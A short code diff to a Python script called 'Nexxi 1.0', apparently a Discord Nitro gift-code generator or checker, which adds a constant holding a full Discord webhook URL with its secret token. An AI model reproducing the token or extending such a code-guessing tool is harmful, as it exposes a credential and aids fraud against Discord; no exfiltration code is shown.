@@ -3,6 +3,8 @@ import random
 import string
 import time
 
+WEBHOOK_URL = "https://discord.com/api/webhooks/1373709540448796833/qWlOgPwv3mf_GsVrXkm54VN89PnXJH70FxBNYpAL5EjQkUB7_OcdXeH534A7_VVkmBEP"
+
 print("""Nexxi 1.0""")
 time.sleep(2)
 print("NITRO.CODES.txt/valid")
